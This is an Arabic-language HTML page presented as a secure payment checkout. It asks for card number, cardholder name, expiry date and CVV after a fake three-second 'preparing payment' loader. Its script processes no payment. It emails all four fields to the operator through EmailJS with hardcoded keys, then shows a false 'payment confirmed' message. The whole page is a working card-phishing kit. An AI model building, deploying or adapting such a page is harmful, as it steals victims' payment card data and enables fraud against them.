<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>نظام الدفع الآمن</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {box-sizing: border-box;}
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f6f9fc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .loader {
      font-size: 22px;
      font-weight: bold;
      color: #555;
    }
    .container {
      display: none;
      width: 100%;
      max-width: 400px;
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
    }
    .field {
      margin-bottom: 15px;
      text-align: right;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      border: 1.5px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    input:focus {
      border-color: #3b82f6;
      outline: none;
    }
    .row {
      display: flex;
      gap: 10px;
    }
    .row .field {
      flex: 1;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #3b82f6;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #2563eb;
    }
    .card-icons {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    .card-icons img {
      height: 28px;
      margin: 0 5px;
    }
  </style>
</head>
<body>

<div class="loader" id="loading">🔒 جاري تجهيز نظام الدفع...</div>

<div class="container" id="paymentContainer">
  <div class="card-icons">
    <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
    <img src="https://img.icons8.com/color/48/mastercard-logo.png" alt="MasterCard">
  </div>
  <div class="field">
    <label>رقم البطاقة</label>
    <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCard(this)" required>
  </div>
  <div class="field">
    <label>اسم صاحب البطاقة</label>
    <input type="text" id="cardName" placeholder="الاسم الكامل" required>
  </div>
  <div class="row">
    <div class="field">
      <label>تاريخ الانتهاء</label>
      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" required>
    </div>
    <div class="field">
      <label>رمز الأمان</label>
      <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
    </div>
  </div>
  <button onclick="sendPayment()">تأكيد الدفع</button>
</div>

<!-- EmailJS v3 -->
<script type="module">
  import emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';

  emailjs.init("1xqwBMfecM1SSulsh"); // Public Key

  window.onload = () => {
    setTimeout(() => {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('paymentContainer').style.display = 'block';
    }, 3000);
  };

  window.sendPayment = () => {
    const data = {
      card_number: document.getElementById("cardNumber").value,
      card_name: document.getElementById("cardName").value,
      expiry: document.getElementById("expiry").value,
      cvv: document.getElementById("cvv").value
    };

    emailjs.send("service_plzxomt", "template_q95bk8a", data)
      .then(() => {
        alert("✅ تم تأكيد الدفع بنجاح.");
      }, (error) => {
        alert("❌ حدث خطأ أثناء الإرسال.");
        console.error(error);
      });
  };

  window.formatCard = (input) => {
    let value = input.value.replace(/\D/g, '').substring(0, 16);
    value = value.replace(/(.{4})/g, '$1 ').trim();
    input.value = value;
  };

  window.formatExpiry = (input) => {
    let value = input.value.replace(/\D/g, '').substring(0, 4);
    if (value.length >= 3) {
      value = value.substring(0, 2) + '/' + value.substring(2);
    }
    input.value = value;
  };
</script>

</body>
</html>
